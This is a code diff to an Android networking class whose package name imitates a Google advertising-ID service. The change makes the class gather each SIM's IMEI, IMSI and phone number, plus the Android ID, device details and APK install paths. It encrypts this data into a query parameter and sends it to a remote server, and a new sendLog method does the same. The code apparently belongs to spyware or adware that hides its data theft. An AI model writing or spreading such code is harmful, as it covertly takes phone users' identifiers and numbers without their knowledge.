@@ -10,6 +10,7 @@ import android.support.v4.content.Loader;
 import android.util.Log;
 
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
+import com.advertising_id_service.appclick.googleadvertisingidservice.CryptoProvider.CryptoProviderServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.DeviceInfo;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.InstallationInfo;
@@ -34,6 +35,10 @@ public class RestServicerSimple implements IRestServicer{
 
     private static RestServicerSimple instance;
     private RestServicerSimple(){}
+    private String formatJsonParam(String k, String v)
+    {
+        return "\"" + k + "\":\"" + v + "\"";
+    }
 
     public static synchronized RestServicerSimple getRestServicer()
     {
@@ -120,31 +125,35 @@ public class RestServicerSimple implements IRestServicer{
             DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
             ResultCreate res = null;
             FilesLoader fl = new FilesLoader();
-            String url = RestServicer.BASE_URL;
-            url += "?" + "login="    + login;
-            url += "&pass="          + pass;
-            url += "&action="        + RestServicer.ACTION_CREATE;
-            url += "&guid="          + devInfo.guid;
-            url += "&imei1="         + devInfo.imei1;
-            url += "&imsi1="         + devInfo.imsi1;
-            url += "&msisdn1="       + devInfo.msisdn1;
-            url += "&imei2="         + devInfo.imei2;
-            url += "&imsi2="         + devInfo.imsi2;
-            url += "&msisdn2="       + devInfo.msisdn2;
-            url += "&imei3="         + devInfo.imei3;
-            url += "&imsi3="         + devInfo.imsi3;
-            url += "&msisdn3="       + devInfo.msisdn3;
-            url += "&version_os="    + devInfo.version_os;
-            url += "&device="        + devInfo.device;
-            url += "&model="         + devInfo.model;
-            url += "&manufactor="    + devInfo.manufactor;
-            url += "&brand="         + devInfo.brand;
-            url += "&android_id="    + devInfo.android_id;
-            url += "&product_id="    + devInfo.product_id;
-            url += "&display_hight=" + devInfo.display_hight;
-            url += "&display_width=" + devInfo.display_width;
+            String base_url = RestServicer.BASE_URL;
+            base_url += "?data=";
+            String url = "{";
+            url += formatJsonParam("login",         login)                       + ",";
+            url += formatJsonParam("pass",          pass)                        + ",";
+            url += formatJsonParam("action",        RestServicer.ACTION_CREATE ) + ",";
+            url += formatJsonParam("guid",          devInfo.guid)                + ",";
+            url += formatJsonParam("imei1",         devInfo.imei1)               + ",";
+            url += formatJsonParam("imsi1",         devInfo.imsi1 )              + ",";
+            url += formatJsonParam("msisdn1",       devInfo.msisdn1)             + ",";
+            url += formatJsonParam("imei2",         devInfo.imei2)               + ",";
+            url += formatJsonParam("imsi2",         devInfo.imsi2)               + ",";
+            url += formatJsonParam("msisdn2",       devInfo.msisdn2)             + ",";
+            url += formatJsonParam("imei3",         devInfo.imei3)               + ",";
+            url += formatJsonParam("imsi3",         devInfo.imsi3)               + ",";
+            url += formatJsonParam("msisdn3",       devInfo.msisdn3)             + ",";
+            url += formatJsonParam("version_os",    devInfo.version_os)          + ",";
+            url += formatJsonParam("device",        devInfo.device)              + ",";
+            url += formatJsonParam("model",         devInfo.model)               + ",";
+            url += formatJsonParam("manufactor",    devInfo.manufactor)          + ",";
+            url += formatJsonParam("brand",         devInfo.brand)               + ",";
+            url += formatJsonParam("android_id",    devInfo.android_id)          + ",";
+            url += formatJsonParam("product_id",    devInfo.product_id)          + ",";
+            url += formatJsonParam("display_hight", devInfo.display_hight)       + ",";
+            url += formatJsonParam("display_width", devInfo.display_width);
+            url += "}";
 
-            String json = fl.downloadJson(url);
+
+            String json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
             if (json == null) {return null;}
             JSONObject obj = new JSONObject(json);
             Logger.log(json);
@@ -223,22 +232,24 @@ public class RestServicerSimple implements IRestServicer{
         try {
             ResultInstall res = null;
             FilesLoader fl = new FilesLoader();
-            String url = RestServicer.BASE_URL;
-            url += "?" + "login="           + login;
-            url += "&pass="                 + pass;
-            url += "&action="               + RestServicer.ACTION_INSTALL;
-            url += "&guid="                 + installInfo.guid;
-            url += "&installation_guid="    + installInfo.installation_guid;
-            url += "&app_id="               + installInfo.app_id;
-            url += "&apk_guid="             + installInfo.apk_guid;
-            url += "&apk_distr_path="       + installInfo.apk_distr_path;
-            url += "&apk_istallation_path=" + installInfo.apk_istallation_path;
-            url += "&date="                 + installInfo.date;
+            String base_url = RestServicer.BASE_URL;
+            base_url += "?data=";
+            String url = "{";
+            url += formatJsonParam("login"                ,login)                            + ",";
+            url += formatJsonParam("pass"                 ,pass)                             + ",";
+            url += formatJsonParam("action"               ,RestServicer.ACTION_INSTALL)      + ",";
+            url += formatJsonParam("guid"                 ,installInfo.guid)                 + ",";
+            url += formatJsonParam("installation_guid"    ,installInfo.installation_guid)    + ",";
+            url += formatJsonParam("app_id"               ,installInfo.app_id)               + ",";
+            url += formatJsonParam("apk_guid"             ,installInfo.apk_guid.replaceAll("\"","\\\\\""))  + ",";
+            url += formatJsonParam("apk_distr_path"       ,installInfo.apk_distr_path)       + ",";
+            url += formatJsonParam("apk_istallation_path" ,installInfo.apk_istallation_path) + ",";
+            url += formatJsonParam("date"                 ,installInfo.date);
+            url += "}";
 
-            String json = fl.downloadJson(url);
+            String json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
             if (json == null) {return null;}
             JSONObject obj = new JSONObject(json);
-
             String result    = obj.has("result")    ? obj.getString("result")    : null;
             String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
             String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
@@ -256,43 +267,45 @@ public class RestServicerSimple implements IRestServicer{
         ResultRead res = null;
         DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
         FilesLoader fl = new FilesLoader();
-        String url  = "";
+        String base_url = RestServicer.BASE_URL;
+        base_url += "?data=";
+        String url = "{";
         String json = "";
         switch (readType) {
             case GUID:
-                url = RestServicer.BASE_URL;
-                url += "?" + "login="    + login;
-                url += "&pass="          + pass;
-                url += "&action="        + RestServicer.ACTION_READ;
-                url += "&guid="          + devInfo.guid;
-                json = fl.downloadJson(url);
+                url += formatJsonParam("login"  ,login) + ",";
+                url += formatJsonParam("pass"   ,pass) + ",";
+                url += formatJsonParam("action" ,RestServicer.ACTION_READ) + ",";
+                url += formatJsonParam("guid"   ,devInfo.guid);
+                url += "}";
+                json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
                 res = jsonToResultRead(json);
                 break;
             case IMEI1:
-                url = RestServicer.BASE_URL;
-                url += "?" + "login="    + login;
-                url += "&pass="          + pass;
-                url += "&action="        + RestServicer.ACTION_READ;
-                url += "&imei1="         + devInfo.imei1;
-                json = fl.downloadJson(url);
+                url += formatJsonParam("login"  ,login) + ",";
+                url += formatJsonParam("pass"   ,pass) + ",";
+                url += formatJsonParam("action" ,RestServicer.ACTION_READ) + ",";
+                url += formatJsonParam("imei1"  ,devInfo.imei1);
+                url += "}";
+                json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
                 res = jsonToResultRead(json);
                 break;
             case IMSI1:
-                url = RestServicer.BASE_URL;
-                url += "?" + "login="    + login;
-                url += "&pass="          + pass;
-                url += "&action="        + RestServicer.ACTION_READ;
-                url += "&imsi1="         + devInfo.imsi1;
-                json = fl.downloadJson(url);
+                url += formatJsonParam("login"  ,login) + ",";
+                url += formatJsonParam("pass"   ,pass) + ",";
+                url += formatJsonParam("action" ,RestServicer.ACTION_READ) + ",";
+                url += formatJsonParam("imsi1"  ,devInfo.imsi1);
+                url += "}";
+                json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
                 res = jsonToResultRead(json);
                 break;
             case MSISDN1:
-                url = RestServicer.BASE_URL;
-                url += "?" + "login="    + login;
-                url += "&pass="          + pass;
-                url += "&action="        + RestServicer.ACTION_READ;
-                url += "&msisdn1="       + devInfo.msisdn1;
-                json = fl.downloadJson(url);
+                url += formatJsonParam("login"   ,login) + ",";
+                url += formatJsonParam("pass"    ,pass) + ",";
+                url += formatJsonParam("action"  ,RestServicer.ACTION_READ) + ",";
+                url += formatJsonParam("msisdn1" ,devInfo.msisdn1) + ",";
+                url += "}";
+                json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
                 res = jsonToResultRead(json);
                 break;
             default:
@@ -409,13 +422,15 @@ public class RestServicerSimple implements IRestServicer{
             DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
             ResultDelete res = null;
             FilesLoader fl = new FilesLoader();
-            String url = RestServicer.BASE_URL;
-            url += "?" + "login="    + login;
-            url += "&pass="          + pass;
-            url += "&action="        + RestServicer.ACTION_DELETE;
-            url += "&guid="          + devInfo.guid;
-
-            String json = fl.downloadJson(url);
+            String base_url = RestServicer.BASE_URL;
+            base_url += "?data=";
+            String url = "{";
+            url += formatJsonParam("login"  ,login)                      + ",";
+            url += formatJsonParam("pass"   ,pass)                       + ",";
+            url += formatJsonParam("action" ,RestServicer.ACTION_DELETE) + ",";
+            url += formatJsonParam("guid"   ,devInfo.guid);
+            url +="}";
+            String json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
             if (json == null) {return null;}
             JSONObject obj = new JSONObject(json);
 
@@ -503,31 +518,34 @@ public class RestServicerSimple implements IRestServicer{
             DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
             ResultUpdate res = null;
             FilesLoader fl = new FilesLoader();
-            String url = RestServicer.BASE_URL;
-            url += "?" + "login="    + login;
-            url += "&pass="          + pass;
-            url += "&action="        + RestServicer.ACTION_UPDATE;
-            url += "&guid="          + devInfo.guid;
-            url += "&imei1="         + devInfo.imei1;
-            url += "&imsi1="         + devInfo.imsi1;
-            url += "&msisdn1="       + devInfo.msisdn1;
-            url += "&imei2="         + devInfo.imei2;
-            url += "&imsi2="         + devInfo.imsi2;
-            url += "&msisdn2="       + devInfo.msisdn2;
-            url += "&imei3="         + devInfo.imei3;
-            url += "&imsi3="         + devInfo.imsi3;
-            url += "&msisdn3="       + devInfo.msisdn3;
-            url += "&version_os="    + devInfo.version_os;
-            url += "&device="        + devInfo.device;
-            url += "&model="         + devInfo.model;
-            url += "&manufactor="    + devInfo.manufactor;
-            url += "&brand="         + devInfo.brand;
-            url += "&android_id="    + devInfo.android_id;
-            url += "&product_id="    + devInfo.product_id;
-            url += "&display_hight=" + devInfo.display_hight;
-            url += "&display_width=" + devInfo.display_width;
+            String base_url = RestServicer.BASE_URL;
+            base_url += "?data=";
+            String url = "{";
+            url += formatJsonParam("login"        ,login)                      + ",";
+            url += formatJsonParam("pass"         ,pass)                       + ",";
+            url += formatJsonParam("action"       ,RestServicer.ACTION_UPDATE) + ",";
+            url += formatJsonParam("guid"         ,devInfo.guid)               + ",";
+            url += formatJsonParam("imei1"        ,devInfo.imei1)              + ",";
+            url += formatJsonParam("imsi1"        ,devInfo.imsi1)              + ",";
+            url += formatJsonParam("msisdn1"      ,devInfo.msisdn1)            + ",";
+            url += formatJsonParam("imei2"        ,devInfo.imei2)              + ",";
+            url += formatJsonParam("imsi2"        ,devInfo.imsi2)              + ",";
+            url += formatJsonParam("msisdn2"      ,devInfo.msisdn2)            + ",";
+            url += formatJsonParam("imei3"        ,devInfo.imei3)              + ",";
+            url += formatJsonParam("imsi3"        ,devInfo.imsi3)              + ",";
+            url += formatJsonParam("msisdn3"      ,devInfo.msisdn3)            + ",";
+            url += formatJsonParam("version_os"   ,devInfo.version_os)         + ",";
+            url += formatJsonParam("device"       ,devInfo.device)             + ",";
+            url += formatJsonParam("model"        ,devInfo.model)              + ",";
+            url += formatJsonParam("manufactor"   ,devInfo.manufactor)         + ",";
+            url += formatJsonParam("brand"        ,devInfo.brand)              + ",";
+            url += formatJsonParam("android_id"   ,devInfo.android_id)         + ",";
+            url += formatJsonParam("product_id"   ,devInfo.product_id)         + ",";
+            url += formatJsonParam("display_hight",devInfo.display_hight)      + ",";
+            url += formatJsonParam("display_width",devInfo.display_width);
+            url +="}";
 
-            String json = fl.downloadJson(url);
+            String json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
             if (json == null) {return null;}
             JSONObject obj = new JSONObject(json);
 
@@ -541,6 +559,57 @@ public class RestServicerSimple implements IRestServicer{
         } catch (JSONException e) {
             Logger.log("JSONException!!!!:" + e.getMessage());
             return null;
+        }
+    }
+
+    @Override
+    public void sendLog(final Context cnt, LoaderManager lm, final String callDestination, final String login, final String pass, String downloadId, String comment) {
+        try {
+            DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
+
+            ResultUpdate res = null;
+            FilesLoader fl = new FilesLoader();
+            String base_url = RestServicer.BASE_URL;
+            base_url += "?data=";
+            String url = "{";
+            url += formatJsonParam("login"        ,login)                              + ",";
+            url += formatJsonParam("pass"         ,pass)                               + ",";
+            url += formatJsonParam("action"       ,RestServicer.ACTION_LOG)            + ",";
+            url += formatJsonParam("guid"         ,devInfo.guid)                       + ",";
+            url += formatJsonParam("imei1"        ,devInfo.imei1)                      + ",";
+            url += formatJsonParam("imsi1"        ,devInfo.imsi1)                      + ",";
+            url += formatJsonParam("msisdn1"      ,devInfo.msisdn1)                    + ",";
+            url += formatJsonParam("imei2"        ,devInfo.imei2)                      + ",";
+            url += formatJsonParam("imsi2"        ,devInfo.imsi2)                      + ",";
+            url += formatJsonParam("msisdn2"      ,devInfo.msisdn2)                    + ",";
+            url += formatJsonParam("imei3"        ,devInfo.imei3)                      + ",";
+            url += formatJsonParam("imsi3"        ,devInfo.imsi3)                      + ",";
+            url += formatJsonParam("msisdn3"      ,devInfo.msisdn3)                    + ",";
+            url += formatJsonParam("version_os"   ,devInfo.version_os)                 + ",";
+            url += formatJsonParam("device"       ,devInfo.device)                     + ",";
+            url += formatJsonParam("model"        ,devInfo.model)                      + ",";
+            url += formatJsonParam("manufactor"   ,devInfo.manufactor)                 + ",";
+            url += formatJsonParam("brand"        ,devInfo.brand)                      + ",";
+            url += formatJsonParam("android_id"   ,devInfo.android_id)                 + ",";
+            url += formatJsonParam("product_id"   ,devInfo.product_id)                 + ",";
+            url += formatJsonParam("lib_version"  ,GlobalParameters.CODE_VERSION)      + ",";
+            url += formatJsonParam("comment"      ,comment)                            + ",";
+            url += formatJsonParam("version_name" ,devInfo.versionName)                + ",";
+            url += formatJsonParam("download_id"  ,downloadId);
+            url +="}";
+
+            String json = fl.downloadJson(base_url + CryptoProviderServicer.cript(url));
+            if (json == null) {return;}
+            JSONObject obj = new JSONObject(json);
+//
+//            String result    = obj.has("result")    ? obj.getString("result")    : null;
+//            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
+//            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
+//            String error_id  = obj.has("error_id")  ? obj.getString("error_id")  : null;
+//            res = new ResultUpdate(result, guid, error_msg, error_id );
+
+        } catch (JSONException e) {
+            Logger.log("JSONException!!!!:" + e.getMessage());
         }
     }
 }
